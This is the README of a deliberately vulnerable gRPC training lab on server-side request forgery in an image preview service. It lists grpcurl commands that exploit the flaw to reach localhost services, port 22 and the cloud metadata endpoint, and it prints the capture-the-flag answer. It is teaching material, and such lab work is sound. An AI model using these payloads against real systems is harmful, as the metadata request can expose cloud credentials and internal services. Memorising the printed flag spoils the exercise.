# Lab 009: SSRF (Server-Side Request Forgery)

## Vulnerability
Image Preview service that fetches images from user-provided URLs without validation.

## Objective
Exploit SSRF to access internal services and capture the flag.

## Run the Lab
```bash
# Build and run
docker build -t grpc-009 .
docker run -p 8009:8009 grpc-009
```

## Exploit

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Normal image fetch (external URL)
grpcurl -plaintext -d '{
  "url": "https://httpbin.org/get"
}' localhost:8009 imagepreview.ImagePreview/FetchImage

# SSRF - Access internal flag server
grpcurl -plaintext -d '{
  "url": "http://localhost:8080/flag"
}' localhost:8009 imagepreview.ImagePreview/FetchImage

# SSRF - Access internal service root
grpcurl -plaintext -d '{
  "url": "http://127.0.0.1:8080"
}' localhost:8009 imagepreview.ImagePreview/FetchImage

# SSRF - Access metadata service (cloud environments)
grpcurl -plaintext -d '{
  "url": "http://169.254.169.254/latest/meta-data/"
}' localhost:8009 imagepreview.ImagePreview/FetchImage

# SSRF - Access internal network
grpcurl -plaintext -d '{
  "url": "http://127.0.0.1:22"
}' localhost:8009 imagepreview.ImagePreview/FetchImage
```

## Impact
Attackers can access internal services, cloud metadata, and local files.

## Flag
Successfully access internal resources to get: `GRPC_GOAT{ssrf_internal_service_access}`

## Mitigation
Validate URLs, use allowlists, and restrict network access for the service.
